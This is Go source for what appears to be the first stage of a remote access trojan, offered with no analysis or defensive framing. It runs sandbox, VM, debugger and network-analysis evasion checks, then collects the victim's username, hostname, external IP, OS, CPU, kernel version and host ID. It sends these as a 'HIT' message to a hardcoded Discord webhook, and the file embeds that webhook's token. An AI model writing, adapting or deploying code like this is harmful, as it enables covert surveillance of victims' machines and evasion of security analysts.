package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"rat/antianalysis"
	"runtime"
	"time"

	discordwebhook "github.com/bensch777/discord-webhook-golang"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/host"
)

func main() {
	done := make(chan struct{})
	defer close(done)

	// Run the checks asynchronously using Goroutines
	go func() {
		checks := []func() bool{
			antianalysis.HostingCheck,
			antianalysis.IsDebuggerPresent,
			antianalysis.IsNetworkAnalysisRunning,
			antianalysis.IsVm,
			antianalysis.SandBoxDetected,
		}

		for _, check := range checks {
			go func(chk func() bool) {
				if chk() {
					os.Exit(69)
				}
				done <- struct{}{}
			}(check)
		}
	}()

	// Wait for all checks to complete
	for range []int{0, 1, 2, 3, 4} {
		<-done
	}

	hostnameCh := make(chan string)
	ipCh := make(chan string)

	go func() {
		hostname, err := os.Hostname()
		if err != nil {
			hostnameCh <- ""
			return
		}
		hostnameCh <- hostname
	}()

	go func() {
		resp, err := http.Get("http://checkip.amazonaws.com/")
		if err != nil {
			ipCh <- ""
			return
		}
		defer resp.Body.Close()

		ipBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			ipCh <- ""
			return
		}
		externalIP := string(ipBytes)
		ipCh <- externalIP
	}()

	hostname := <-hostnameCh
	externalIP := <-ipCh

	os := runtime.GOOS
	arch := runtime.GOARCH

	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	ramKB := m.Sys

	cpuThreads := runtime.GOMAXPROCS(0)

	cpuInfo, err := cpu.Info()
	if err != nil {
		return
	}
	cpuName := cpuInfo[0].ModelName

	hostInfo, err := host.Info()
	if err != nil {
		return
	}
	platform := hostInfo.Platform
	kernelVersion := hostInfo.KernelVersion
	hostID := hostInfo.HostID

	webhookURL := "https://discord.com/api/webhooks/1125782647596138608/QKSMQL2MffWcUK98_QEYmtzUadc8CdMhku7N-o3_Uuzn6YTI6kfDOuUMFOG1ozPZ7WBD"

	emb := discordwebhook.Embed{
		Title:     "HIT",
		Timestamp: time.Now(),
		Author: discordwebhook.Author{
			Name: "SussyWussy",
		},
		Fields: []discordwebhook.Field{
			{
				Name:  "Username",
				Value: getUsername(),
			},
			{
				Name:  "Hostname",
				Value: hostname,
			},
			{
				Name:  "IP",
				Value: externalIP,
			},
			{
				Name:  "OS",
				Value: fmt.Sprintf("%s %s", os, arch),
			},
			{
				Name:  "RAM",
				Value: fmt.Sprintf("%d KB", ramKB),
			},
			{
				Name:  "CPU Threads",
				Value: fmt.Sprintf("%d", cpuThreads),
			},
			{
				Name:  "CPU Model",
				Value: cpuName,
			},
			{
				Name:  "Platform",
				Value: platform,
			},
			{
				Name:  "Kernel Version",
				Value: kernelVersion,
			},
			{
				Name:  "Host ID",
				Value: hostID,
			},
		},
	}

	SendEmbed(webhookURL, emb)
}

func SendEmbed(link string, embeds discordwebhook.Embed) error {
	hook := discordwebhook.Hook{
		Username: "WOW",
		Embeds:   []discordwebhook.Embed{embeds},
	}
	payload, err := json.Marshal(hook)
	if err != nil {
		return err
	}
	err = discordwebhook.ExecuteWebhook(link, payload)
	return err

}

func getUsername() string {
	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		usr, err := user.Current()
		if err != nil {
			return "Unable to get"
		}
		return usr.Username
	} else if runtime.GOOS == "windows" {
		username := os.Getenv("USERNAME")
		if username == "" {
			return "Unable to get"
		}
		return username
	} else {
		return "Unable to get"
	}
}
